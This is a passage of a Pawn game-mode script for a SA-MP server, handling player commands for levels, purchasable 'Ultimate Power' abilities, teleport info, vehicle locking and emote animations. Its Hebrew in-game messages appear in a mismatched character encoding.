			if(cmd[0] != '/') format(cmd,sizeof(cmd),"/%s",cmd);
			new string[M_S], t = -1;
			for(new i = 0; i < sizeof(Teleports); i++) if(equal(Teleports[i][Tcmd],cmd)) t = i;
			if(t == -1) return SendClientMessage(playerid,red," .∙э ∙щтх° ∙тхщ");
			format(string,sizeof(string)," ~~~ :%s Ї°шщ ф∙щтх° ~~~",Teleports[t][Tcmd]);
			SendClientMessage(playerid,lightblue,string);
			format(string,sizeof(string)," Х %02d :юёЇ° ёщух°щ",t);
			SendClientMessage(playerid,grey,string);
			if(!strlen(Teleports[t][Tauthor])) SendClientMessage(playerid,grey," Х ЁхЎ° Є\"щ Ўхх· фЁфь· ф∙°·");
			else
			{
				format(string,sizeof(string)," Х %s ЁхЎ° Є\"щ",Teleports[t][Tauthor]);
				SendClientMessage(playerid,grey,string);
			}
			format(string,sizeof(string)," Х с∙щтх° цф %s ь·ўхє",Teleports[t][Tnoshooting] ? ("рёх°") : ("юх·°"));
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string)," Х ∙щтх° цф ю∙т° %s °ыс",Teleports[t][Twithv] ? ("Єэ") : ("сьщ"));
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string)," Х %d ∙щтх° цф ўщщэ сЄхьэ юёЇ°",Teleports[t][Tw]);
			SendClientMessage(playerid,grey,string);
		}
		return 1;
	}
	if(equal(cmd,"/level"))
	{
		new string[256];
		format(string,sizeof(string),@c(blue) ":р·ф ы°тЄ с°юф " @c(lightblue) "%d" @c(blue) " хщ∙ ьъ " @c(lightblue) "%d" @c(blue) " ф°щтх·",playerinfo[playerid][level],playerinfo[playerid][kills]);
		if(playerinfo[playerid][level] >= sizeof(levels)-1) format(string,sizeof(string),"%s\n\n" @c(red) "!цх ф°юф фыщ тсхфф хьыя ьр ·хыь ьЄьх· Єху °юх·",string);
		else
		{
			new morekills = levels[playerinfo[playerid][level]+1][NeedKills]-playerinfo[playerid][kills];
			format(string,sizeof(string),"%s\n\n" @c(green) "Х ь°юф фсрф Ў°щъ " @c(lightgreen) "%d" @c(green) " ф°щтх·",string,levels[playerinfo[playerid][level]+1][NeedKills]);
			format(string,sizeof(string),"%s\n" @c(red) "Х !чё°х· ьъ " @c(darkred) "%d" @c(red) " ф°щтх· ыущ ьЄьх· ь°юф " @c(darkred) "%d",string,morekills,playerinfo[playerid][level]+1);
		}
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "°ю· ∙чўя",string,"ётх°","");
		return 1;
	}
	if(equal(cmd,"/levels"))
	{
		new string[256];
		format(string,sizeof(string),@c(white) "(1)" @h(FF0000) " ыюх· фф°щтх· ∙у°х∙х· ьыь °юф");
		format(string,sizeof(string),"%s\n" @c(white) "(2)" @h(FF8000) " чщщэ хютя ю·юьрщэ ьрч° ф°щтф",string);
		format(string,sizeof(string),"%s\n" @c(white) "(3)" @h(FFFF00) " ютсь· ыёє ссЁў",string);
		format(string,sizeof(string),"%s\n" @c(white) "(4)" @h(008000) " ютсь· ыух°щэ ьЁ∙ў",string);
		format(string,sizeof(string),"%s\n" @c(white) "(5)" @h(0000FF) " ютсь· рЁ°тщф",string);
		ShowPlayerDialog(playerid,dialog_levels,DIALOG_STYLE_LIST,@c(lightblue) "°∙щюх· фў∙х°х· с°юх· ф∙чўя",string,"счщ°ф","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/labelbhuy")) return playerinfo[playerid][level] = random(500), 1;
	if(equal(cmd,"/lcmds"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ь∙щюх∙ сЇўхуф цх");
		new dia[512*4], string[M_S], mid;
		cmd = strtok(cmdtext,idx), mid = !strlen(cmd) || !IsNumeric(cmd) ? 1 : strval(cmd);
		if(mid < 1 || mid > 2) mid = 1;
		dia = @c(green) "р·ф щыхь ьф∙·ю∙ сЇўхух· ∙юёхюЁх· сЎсЄ щ°хў\n" @c(lightred) "р·ф ьр щыхь ьф∙·ю∙ сЇўхух· ∙юёхюЁх· сЎсЄ рухэ\n";
		for(new i = mid == 1 ? 0 : (sizeof(lcmds) / 2); i < (mid == 1 ? (sizeof(lcmds) / 2) : sizeof(lcmds)); i++)
		{
			format(string,sizeof(string),@c(orange) " Х #%02d) {%s}%s" @c(orange) " [Level: " @c(yellow) "%d" @c(orange),i+1,HexStringOfColor(playerinfo[playerid][level] >= lcmds[i][lcLevel] ? green : lightred),lcmds[i][lcCommand],lcmds[i][lcLevel]);
			if(lcmds[i][lcCost] > 0) format(string,sizeof(string),"%s | Cost: " @c(yellow) "%d$" @c(orange),string,lcmds[i][lcCost]);
			if(lcmds[i][lcCL]) format(string,sizeof(string),"%s | CMD Level: " @c(yellow) "%d/%d" @c(orange),string,playerinfo[playerid][upgradecmd][i],lcmds[i][lcMaxCL]);
			format(string,sizeof(string),"%s]",string);
			format(dia,sizeof(dia),"%s\n%s",dia,string);
		}
		format(dia,sizeof(dia),"%s\n\n" @c(blue) ":ыущ ьўсь ющуЄ Єь Їўхуф рх ь∙у°т ф∙·ю∙ сыЇ·х° " @c(darkblue) "рЇ∙°хщх·" @c(blue) " ьрч° ∙·°∙хэ ыря р· юёЇ° фЇўхуф рх р· ∙юф",dia);
		if(mid == 1)
		{
			format(dia,sizeof(dia),"%s\n" @c(blue) "(рх \"фср\" ыущ ь°рх· Їўхух· ЁхёЇх· Next °∙хэ)",dia);
			ShowPlayerDialog(playerid,dialog_lcmds,DIALOG_STYLE_INPUT,@c(lightblue) "Їўхух· ь°юх·",dia,"рЇ∙°хщх·","щЎщрф");
		}
		else
		{
			format(dia,sizeof(dia),"%s\n" @c(blue) "(рх \"фўхуэ\" ыущ ь°рх· р· ф·Ї°щш фўхуэ ∙ь фЇўхух· Prev °∙хэ)",dia);
			ShowPlayerDialog(playerid,dialog_lcmds,DIALOG_STYLE_INPUT,@c(lightblue) "Їўхух· ь°юх· #2",dia,"рЇ∙°хщх·","щЎщрф");
		}
		return 1;
	}
	if(equal(cmd,"/upower"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ь∙щюх∙ сЇўхуф цх");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /upower [help/list/buy/keys/remove/info] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /upower help - Єц°ф сЁх∙р фыхч фрхьшщюшщсщ");
			SendClientMessage(playerid,white," /upower list - °∙щю· фыхчх· фўщщющэ");
			SendClientMessage(playerid,white," /upower buy - ўЁщщ· ыхч");
			SendClientMessage(playerid,white," /upower keys - рЇ∙°хщх· юў∙щ фыхч");
			SendClientMessage(playerid,white," /upower remove - ючщў· фыхч фрхьшщюшщсщ ∙ьъ");
			SendClientMessage(playerid,white," /upower info - ющуЄ Єь фыхч фрхьшщюшщсщ ∙ьъ");
			return SendClientMessage(playerid,red," !сюухщщў /upower2 buy ∙щэ ьс! ьўЁщщ· ыхч рхьшщюшщсщ ∙Ёщ щ∙ ьф∙·ю∙ сЇўхуф");
		}
		if(equal(cmd,"help"))
		{
			cmd = strtok(cmdtext,idx);
			new h = !strlen(cmd) || !IsNumeric(cmd) ? 1 : strval(cmd);
			if(h < 1 || h > 2) h = h > 2 ? 2 : 1;
			format(string,sizeof(string)," ~~~ Ultimate Power Help #%d: ~~~",h);
			SendClientMessage(playerid,lightblue,string);
			if(h == 1)
			{
				SendClientMessage(playerid,purple," ╗ :?Ultimate Power юф цф");
				SendClientMessage(playerid,yellow," Х Ultimate Power = фыхч фрхьшщюшщсщ, фщыхь· фчцўф сщх·° ∙щыхьф ьфщх· ь∙чўя ∙ьъ");
				SendClientMessage(playerid,yellow," Х Ёщ·я ьўЁх· ыхч ыцф сючщ° юрху тсхф | фыхч фрхьшщюшщсщ Ё∙ю° ь·ющу");
				SendClientMessage(playerid,purple," ╗ :?ыщЎу ьф∙·ю∙ сыхч фцф");
				SendClientMessage(playerid,yellow," Х /upower keys - суўх у°ъ фЇўхуф фцх срщцф юў∙щэ ·Ўш°ых ьф∙·ю∙ ыущ ьфЇЄщь р· фыхч");
				SendClientMessage(playerid,yellow," Х ыущ ьф∙·ю∙ сыхч щ∙ ьфчцщў р· фюў∙щэ Єу ьющьхщ фюу ∙юхЎт ьюшф, ющьхщ Єу ь°ю· фыхч ф°Ўхщф");
				SendClientMessage(playerid,yellow," Х ∙щэ ьс! ·хыь ьф∙·ю∙ с°юх· фюёхщщюх· ∙ь фыхч ьЇщ °ю· ф∙чўя ∙ьъ");
				SendClientMessage(playerid,red," Х !ч∙хс ьуЄ· тэ ыщ ∙щюх∙ с°юх· фыхч ф∙хЁх· юсцсц рЁ°тщф");
				SendClientMessage(playerid,grey," /upower help 2 :ьфю∙ъ");
			}
			if(h == 2)
			{
				SendClientMessage(playerid,purple," ╗ :Їўхух·");
				SendClientMessage(playerid,orange," * /upower list - °∙щю· фыхчх· фрхьшщюшщсщщэ ∙Ёщ·я ьўЁх·");
				SendClientMessage(playerid,orange," * /upower buy - ўЁщщ· ыхч рхьшщюшщсщ");
				SendClientMessage(playerid,orange," * /upower keys - ЎЇщщф сюў∙щэ ь∙щюх∙ сыхч рхьшщюшщсщ, Є\"Ї фю∙чў ∙ьъ");
				SendClientMessage(playerid,orange," * /upower - ...Їўхух· ЁхёЇх·");
				SendClientMessage(playerid,purple," ╗ :∙щюх∙ сыхч Ёхёє");
				SendClientMessage(playerid,yellow," Х /upower2 :Ёщ·Ё· рЇ∙°х· ьф∙·ю∙ сЄу ∙Ёщ ыхчх· рхьшщюшщсщщэ! ьЇ°шщэ ЁхёЇщэ");
			}
		}
		else if(equal(cmd,"list"))
		{
			new list[1024];
			for(new i = 0; i < sizeof(UltimatePowers); i++) format(list,sizeof(list),!strlen(list) ? ("%s%s%s - ыхч юёЇ° %d [Level: %d | Cost: $%d]") : ("%s\n%s%s - ыхч юёЇ° %d [Level: %d | Cost: $%d]"),list,UltimatePowers[i][upColor],UltimatePowers[i][upTitle],i+1,UltimatePowers[i][upBuyLevel],UltimatePowers[i][upCost]);
			ShowPlayerDialog(playerid,dialog_upowers,DIALOG_STYLE_LIST,@c(lightblue) "°∙щю· ыхчх· рхьшщюшщсщщэ",list,"ющуЄ","ётх°");
		}
		else if(equal(cmd,"buy"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /upower buy [upower id] :Ўх°· ф∙щюх∙");
			new id = strval(cmd);
			if(id < 1 || id > sizeof(UltimatePowers)) return SendClientMessage(playerid,red," .юёЇ° ыхч рхьшщюшщсщ ∙тхщ");
			id--;
			if(playerinfo[playerid][level] < UltimatePowers[id][upBuyLevel])
			{
				format(string,sizeof(string)," .ух°∙ ьЇчх· °юф %d %s °ю· ф∙чўя ∙ьъ ьр юёЇщўф, фыхч",UltimatePowers[id][upBuyLevel],UltimatePowers[id][upTitle]);
				return SendClientMessage(playerid,red,string);
			}
			if(GetMoney(playerid) < UltimatePowers[id][upCost])
			{
				format(string,sizeof(string)," .Єхьф $%d %s рщя ьъ юёЇщў ыёє, фыхч",UltimatePowers[id][upCost],UltimatePowers[id][upTitle]);
				return SendClientMessage(playerid,red,string);
			}
			if(playerinfo[playerid][upower] == id) return SendClientMessage(playerid,red," .р·ф ыс° ю∙·ю∙ сыхч фцф с·х° ыхч °р∙хя");
			if(playerinfo[playerid][upower2] == id) return SendClientMessage(playerid,red," .р·ф ыс° ю∙·ю∙ сыхч фцф с·х° ыхч ∙Ёщ");
			if(playerinfo[playerid][upower2] != -1) return SendClientMessage(playerid,red," /upower remove :ыс° щ∙ ьъ ыхч рхьшщюшщсщ °р∙хя, Єь юЁ· ьючхў рх·х");
			fsetint(fuser(playerid),"PlayerUPower",id);
			fsetint(fuser(playerid),"PlayerUPowerKeys",DEFAULT_UPOWER_KEYS);
			playerinfo[playerid][upower] = id, playerinfo[playerid][upowerkeys] = DEFAULT_UPOWER_KEYS;
			GiveMoney(playerid,0-UltimatePowers[id][upCost], 16);
			format(string,sizeof(string)," ╗ /upower help ?°хЎщэ тэ !%s ўЁф ыхч рхьшщюшщсщ юёхт %s",UltimatePowers[id][upTitle],GetName(playerid));
			SendClientMessageToAll(orange,string);
			format(string,sizeof(string)," ~~~ :%s - ўЁщ· ыхч рхьшщюшщсщ ~~~",UltimatePowers[id][upTitle]);
			SendClientMessage(playerid,lightblue,string);
			SendClientMessage(playerid,orange,UltimatePowers[id][upText]);
			format(string,sizeof(string)," %s :рьюЁш",UltimatePowers[id][upElement]);
			SendClientMessage(playerid,white,string);
			SendClientMessage(playerid,orange," Х /upower keys :Єь юЁ· ьф∙·ю∙ сыхч ·Ўш°ъ ььчхї Єь юў∙щэ. ыущ ь°рх· рщцф ф∙·ю∙ сЇўхуф");
			SendClientMessage(playerid,orange," Х /upower info :ьющуЄ Єь фрЇ∙°хщх· ∙ь фыхч");
		}
		else if(equal(cmd,"keys"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /upower keys [show/change/default] :Ўх°· ф∙щюх∙");
				SendClientMessage(playerid,white," /upower keys show - фЎт· фюў∙щэ ь∙щюх∙ сыхч фрхьшщюшщсщ");
				SendClientMessage(playerid,white," /upower keys change - ∙щЁхщ юў∙щ фыхч фрхьшщюшщсщ");
				return SendClientMessage(playerid,white," /upower keys default - ∙щЁхщ юў∙щ фыхч фрхьшщюшщсщ ьюў∙щэ фсёщёщщэ");
			}
			if(equal(cmd,"show"))
			{
				if(playerinfo[playerid][upower] == -1) return SendClientMessage(playerid,red," .рщя ьъ ыхч рхьшщюшщсщ");
				if(playerinfo[playerid][upowerkeys] != DEFAULT_UPOWER_KEYS) return SendClientMessage(playerid,red," .Ёщ·я ь°рх· р· юў∙щ фыхч фрхьшщюшщсщ Єь фюёъ °ў рэ фэ фсёщёщщэ");
				GameTextForPlayer(playerid,"~b~ultimate power keys:~n~~y~~k~~SNEAK_ABOUT~ ~b~+ ~y~~k~~PED_SPRINT~",4500,0);
			}
			else if(equal(cmd,"change"))
			{
				if(playerinfo[playerid][upower] == -1) return SendClientMessage(playerid,red," .рщя ьъ ыхч рхьшщюшщсщ");
				playerinfo[playerid][upkeyschanging] = 1;
				SendClientMessage(playerid,yellow," ...Ёр ььчхї Єь фюў∙щэ ∙с°ЎхЁъ ьф∙·ю∙ сфэ сыхч фрхьшщюшщсщ");
				SendClientMessage(playerid,yellow," (!∙щэ ьс: Ёщ·я ьф∙·ю∙ сюў∙щэ ∙ыс° ю∙хю∙щэ сю∙чў сьсу)");
			}
			else if(equal(cmd,"default"))
			{
				if(playerinfo[playerid][upower] == -1) return SendClientMessage(playerid,red," .рщя ьъ ыхч рхьшщюшщсщ");
				if(playerinfo[playerid][upowerkeys] == DEFAULT_UPOWER_KEYS) return SendClientMessage(playerid,red," .фюў∙щэ ∙ьъ фэ ыс° фюў∙щэ фсёщёщщэ");
				playerinfo[playerid][upowerkeys] = DEFAULT_UPOWER_KEYS;
				fsetint(fuser(playerid),"PlayerUPowerKeys",DEFAULT_UPOWER_KEYS);
				SendClientMessage(playerid,green," .юў∙щ фыхч фрхьшщюшщсщ ∙ьъ ф∙·Ёх ьюў∙щ с°щ°· фючуь");
			}
			else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		}
		else if(equal(cmd,"remove"))
		{
			if(playerinfo[playerid][upower] == -1) return SendClientMessage(playerid,red," .рщя ьъ ыхч рхьшщюшщсщ");
			format(string,sizeof(string)," .%s - ючў· р· фыхч фрхьшщюшщсщ ∙ьъ",UltimatePowers[playerinfo[playerid][upower]][upTitle]);
			SendClientMessage(playerid,green,string);
			playerinfo[playerid][upower] = -1;
			fsetint(fuser(playerid),"PlayerUPower",-1);
		}
		else if(equal(cmd,"info")) ShowUPowerInfo(playerid,playerinfo[playerid][upower]);
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/upower2"))
	{
		if(!equal(GetName(playerid),"(gmR)Amit")) return SendClientMessage(playerid,red," .фюЄ°ы· ·чцх° сў°хс");
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· °∙хэ хючхс° ь∙щюх∙ сЇўхуф цх");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /upower2 [help/list/buy/keys/remove/info] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /upower2 help - Єц°ф сЁх∙р фыхч фрхьшщюшщсщ");
			SendClientMessage(playerid,white," /upower2 list - °∙щю· фыхчх· фўщщющэ");
			SendClientMessage(playerid,white," /upower2 buy - ўЁщщ· ыхч ∙Ёщ");
			SendClientMessage(playerid,white," /upower2 keys - рЇ∙°хщх· юў∙щ фыхч ф∙Ёщ");
			SendClientMessage(playerid,white," /upower2 remove - ючщў· фыхч фрхьшщюшщсщ ф∙Ёщ ∙ьъ");
			SendClientMessage(playerid,white," /upower2 info - ющуЄ Єь фыхч фрхьшщюшщсщ ∙ьъ");
			return SendClientMessage(playerid,red," !∙щэ ьс! ЇЄхьх· рьх ў∙х°х· ьыхч фрхьшщюшщсщ ф∙Ёщ");
		}
		if(equal(cmd,"help")) command(playerid,"/upower help 1");
		else if(equal(cmd,"list")) command(playerid,"/upower list");
		else if(equal(cmd,"buy"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /upower2 buy [upower id] :Ўх°· ф∙щюх∙");
			new id = strval(cmd);
			if(id < 1 || id > sizeof(UltimatePowers)) return SendClientMessage(playerid,red," .юёЇ° ыхч рхьшщюшщсщ ∙тхщ");
			id--;
			if(playerinfo[playerid][level] < UltimatePowers[id][upBuyLevel])
			{
				format(string,sizeof(string)," .ух°∙ ьЇчх· °юф %d %s °ю· ф∙чўя ∙ьъ ьр юёЇщўф, фыхч",UltimatePowers[id][upBuyLevel],UltimatePowers[id][upTitle]);
				return SendClientMessage(playerid,red,string);
			}
			if(GetMoney(playerid) < UltimatePowers[id][upCost])
			{
				format(string,sizeof(string)," .Єхьф $%d %s рщя ьъ юёЇщў ыёє, фыхч",UltimatePowers[id][upCost],UltimatePowers[id][upTitle]);
				return SendClientMessage(playerid,red,string);
			}
			if(playerinfo[playerid][upower] == id) return SendClientMessage(playerid,red," .р·ф ыс° ю∙·ю∙ сыхч фцф с·х° ыхч °р∙хя");
			if(playerinfo[playerid][upower2] == id) return SendClientMessage(playerid,red," .р·ф ыс° ю∙·ю∙ сыхч фцф с·х° ыхч ∙Ёщ");
			if(playerinfo[playerid][upower2] != -1) return SendClientMessage(playerid,red," /upower2 remove :ыс° щ∙ ьъ ыхч рхьшщюшщсщ ∙Ёщ, Єь юЁ· ьючхў рх·х");
			fsetint(fuser(playerid),"PlayerUPower2",id);
			fsetint(fuser(playerid),"PlayerUPowerKeys2",DEFAULT_UPOWER2_KEYS);
			playerinfo[playerid][upower2] = id, playerinfo[playerid][upowerkeys2] = DEFAULT_UPOWER2_KEYS;
			GiveMoney(playerid,0-UltimatePowers[id][upCost], 16);
			format(string,sizeof(string)," ╗ /upower2 help ?°хЎщэ тэ !%s ўЁф ыхч рхьшщюшщсщ ∙Ёщ юёхт %s",UltimatePowers[id][upTitle],GetName(playerid));
			SendClientMessageToAll(orange,string);
			format(string,sizeof(string)," ~~~ :%s - ўЁщ· ыхч рхьшщюшщсщ ∙Ёщ ~~~",UltimatePowers[id][upTitle]);
			SendClientMessage(playerid,lightblue,string);
			SendClientMessage(playerid,orange,UltimatePowers[id][upText]);
			format(string,sizeof(string)," %s :рьюЁш",UltimatePowers[id][upElement]);
			SendClientMessage(playerid,white,string);
			SendClientMessage(playerid,orange," Х /upower2 keys :Єь юЁ· ьф∙·ю∙ сыхч ·Ўш°ъ ььчхї Єь юў∙щэ. ыущ ь°рх· рщцф ф∙·ю∙ сЇўхуф");
			SendClientMessage(playerid,orange," Х /upower2 info :ьющуЄ Єь фрЇ∙°хщх· ∙ь фыхч");
		}
		else if(equal(cmd,"keys"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /upower2 keys [show/change/default] :Ўх°· ф∙щюх∙");
				SendClientMessage(playerid,white," /upower2 keys show - фЎт· фюў∙щэ ь∙щюх∙ сыхч фрхьшщюшщсщ");
				SendClientMessage(playerid,white," /upower2 keys change - ∙щЁхщ юў∙щ фыхч фрхьшщюшщсщ");
				return SendClientMessage(playerid,white," /upower2 keys default - ∙щЁхщ юў∙щ фыхч фрхьшщюшщсщ ьюў∙щэ фсёщёщщэ");
			}
			if(equal(cmd,"show"))
			{
				if(playerinfo[playerid][upower2] == -1) return SendClientMessage(playerid,red," .рщя ьъ ыхч рхьшщюшщсщ ∙Ёщ");
				if(playerinfo[playerid][upowerkeys2] != DEFAULT_UPOWER2_KEYS) return SendClientMessage(playerid,red," .Ёщ·я ь°рх· р· юў∙щ фыхч фрхьшщюшщсщ Єь фюёъ °ў рэ фэ фсёщёщщэ");
				GameTextForPlayer(playerid,"~b~ultimate 2 power keys:~n~~y~~k~~TOGGLE_SUBMISSIONS~ ~b~+ ~y~~k~~SNEAK_ABOUT~",4500,0);
			}
			else if(equal(cmd,"change"))
			{
				if(playerinfo[playerid][upower2] == -1) return SendClientMessage(playerid,red," .рщя ьъ ыхч рхьшщюшщсщ ∙Ёщ");
				playerinfo[playerid][upkeyschanging] = 2;
				SendClientMessage(playerid,yellow," ...Ёр ььчхї Єь фюў∙щэ ∙с°ЎхЁъ ьф∙·ю∙ сфэ сыхч фрхьшщюшщсщ ф∙Ёщ");
				SendClientMessage(playerid,yellow," (!∙щэ ьс: Ёщ·я ьф∙·ю∙ сюў∙щэ ∙ыс° ю∙хю∙щэ сю∙чў сьсу)");
			}
			else if(equal(cmd,"default"))
			{
				if(playerinfo[playerid][upower2] == -1) return SendClientMessage(playerid,red," .рщя ьъ ыхч рхьшщюшщсщ ∙Ёщ");
				if(playerinfo[playerid][upowerkeys2] == DEFAULT_UPOWER2_KEYS) return SendClientMessage(playerid,red," .фюў∙щэ ∙ьъ фэ ыс° фюў∙щэ фсёщёщщэ");
				playerinfo[playerid][upowerkeys] = DEFAULT_UPOWER2_KEYS;
				fsetint(fuser(playerid),"PlayerUPowerKeys",DEFAULT_UPOWER2_KEYS);
				SendClientMessage(playerid,green," .юў∙щ фыхч фрхьшщюшщсщ ф∙Ёщ ∙ьъ ф∙·Ёх ьюў∙щ с°щ°· фючуь");
			}
			else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		}
		else if(equal(cmd,"remove"))
		{
			if(playerinfo[playerid][upower2] == -1) return SendClientMessage(playerid,red," .рщя ьъ ыхч рхьшщюшщсщ");
			format(string,sizeof(string)," .%s - ючў· р· фыхч фрхьшщюшщсщ ∙ьъ",UltimatePowers[playerinfo[playerid][upower2]][upTitle]);
			SendClientMessage(playerid,green,string);
			playerinfo[playerid][upower2] = -1;
			fsetint(fuser(playerid),"PlayerUPower2",-1);
		}
		else if(equal(cmd,"info")) ShowUPowerInfo(playerid,playerinfo[playerid][upower2]);
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(strlen(cmd) < 16) if((playerinfo[playerid][usedcmd] = lcmdid(cmd)) != -1)
	{
		if(playerinfo[playerid][level] < lcmds[playerinfo[playerid][usedcmd]][lcLevel])
		{
			format(cmdstring,sizeof(cmdstring)," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· с°юф %d",lcmds[playerinfo[playerid][usedcmd]][lcLevel]);
			return SendClientMessage(playerid,red,cmdstring);
		}
		if(lcmds[playerinfo[playerid][usedcmd]][lcCost] > 0 && GetMoney(playerid) < lcmds[playerinfo[playerid][usedcmd]][lcCost])
		{
			format(cmdstring,sizeof(cmdstring)," .Їўхуф цх ух°∙· ьЇчх· %d$",lcmds[playerinfo[playerid][usedcmd]][lcCost]);
			return SendClientMessage(playerid,red,cmdstring);
		}
		if(lcmds[playerinfo[playerid][usedcmd]][lcComp] && (GetPlayerVirtualWorld(playerid) > 999 && GetPlayerVirtualWorld(playerid) < 2001)) return SendClientMessage(playerid, red, " .Їўхуф цх чёхюф ьющўхюъ");
	}
	if(playerinfo[playerid][usedcmd] != -1)
	{
		if(equal(cmd,"/me"))
		{
			new text[256], string[M_S];
			if((chatlocked || playerinfo[playerid][mute][0] > 0)) return SendClientMessage(playerid,red," .ьр ·хыь ьф∙·ю∙ сЇўхуф фцх сюЎсъ фЁхычщ");
			text = strrest(cmdtext,idx);
			if(!strlen(text)) return SendClientMessage(playerid,white," /me [text] :Ўх°· ф∙щюх∙");
			if(equal(playerinfo[playerid][lastmetext],text)) return SendClientMessage(playerid,red," !me рёх° ьфЎщє с");
			format(string,sizeof(string)," ** %s %s",GetName(playerid),text);
			SendClientMessageToAll(blue,string);
			SetString(playerinfo[playerid][lastmetext],text);
			SetPlayerChatBubble(playerid,text,blue,20.0,10000);
		}
		if(equal(cmd,"/cbubble"))
		{
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /cbubble [text] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,blue," :фшўёш фср Ёхёє юЄь уюх·ъ");
			SendClientMessage(playerid,blue,cmd);
			SetPlayerChatBubble(playerid,cmd,white,20.0,30000);
		}
		if(equal(cmd,"/lock"))
		{
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс");
			switch(GetPlayerState(playerid))
			{
				case PLAYER_STATE_PASSENGER: SendClientMessage(playerid,red," .Єьщъ ьфщх· фЁфт сыущ ьЁЄхь р· ф°ыс");
				case PLAYER_STATE_DRIVER:
				{
					new v = GetPlayerVehicleID(playerid);
					if(GetVehicleModel(v) == 425 || GetVehicleModel(v) == 520) return SendClientMessage(playerid, red, " .ьр Ёщ·я ьЁЄхь °ыс юёхт цф");
					if(vehicleinfo[v][locked]) return SendClientMessage(playerid,red," .ф°ыс ыс° ЁЄхь");
					if(IsBike(v)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьЁЄхь рхЇЁхЄщэ");
					SendClientMessage(playerid,green," .фюыхЁщ· ЁЁЄьф");
					for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && i != playerid) SetVehicleParamsForPlayer(v,i,0,1);
					vehicleinfo[v][lastdriver] = playerid;
					vehicleinfo[v][locked] = 1;
				}
				default: SendClientMessage(playerid,red," .Єьщъ ьфщх· с·хъ ф°ыс сыущ ьЁЄхь рх·х");
			}
		}
		if(equal(cmd,"/unlock"))
		{
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс");
			switch(GetPlayerState(playerid))
			{
				case PLAYER_STATE_PASSENGER: SendClientMessage(playerid,red," .Єьщъ ьфщх· фЁфт сыущ ьЇ·хч р· ф°ыс");
				case PLAYER_STATE_DRIVER:
				{
					new v = GetPlayerVehicleID(playerid);
					if(!vehicleinfo[v][locked]) return SendClientMessage(playerid,red," .ф°ыс рщЁх ЁЄхь");
					if(IsBike(v)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьЇ·хч рхЇЁхЄщэ");
					SendClientMessage(playerid,green," .фюыхЁщ· ЁЇ·чф");
					for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && i != playerid) SetVehicleParamsForPlayer(v,i,0,0);
					vehicleinfo[v][lastdriver] = INVALID_PLAYER_ID;
					vehicleinfo[v][locked] = 0;
				}
				default: SendClientMessage(playerid,red," .Єьщъ ьфщх· с·хъ ф°ыс сыущ ьЇ·хч рх·х");
			}
		}
		if(equal(cmd,"/kiss"))
		{
			cmd = strtok(cmdtext, idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /kiss [id/name] :Ўх°· ф∙щюх∙");
			new id = ReturnUser(cmd,playerid), Float:p[3];
			if(!CanUseCommand(playerid)) return 1;
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(id == playerid) return SendClientMessage(playerid,red," !рщущхш, р·ф ьр щыхь ьЁ∙ў р· ЄЎюъ");
			if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .р·ф ьр щыхь ьЁ∙ў сюЎсъ фЁхычщ");
			if(GetPlayerState(id) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .ф∙чўя ∙Ёщёщ· ьЁ∙ў ьр щыхь ьўсь р· цф сюЎсх фЁхычщ");
			GetPlayerPos(id,p[0],p[1],p[2]);
			if(GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]) > 3.0) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ў°хс рь ф∙чўя фцф");
			if(!IsPlayerFacingPlayer(playerid,id,5.0)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЄюху юхь ф∙чўя");
			if(CheckIfCommandUsed(playerid,7,true)) return 1;
			GetPlayerPos(id,p[0],p[1],p[2]);
			GetXYInFrontOfPlayer(id,p[0],p[1],1.0);
			SetFreeze(id,0);
			SetPlayerPos(playerid,p[0],p[1],p[2]);
			SetPlayerToFacePlayer(playerid,id);
			ApplyAnimation(id,"KISSING","Playa_kiss_03",4.0,0,0,0,1,0,1);
			ApplyAnimation(playerid,"KISSING","Playa_kiss_03",4.0,0,0,0,1,0,1);
		}
		if(equal(cmd,"/pee"))
		{
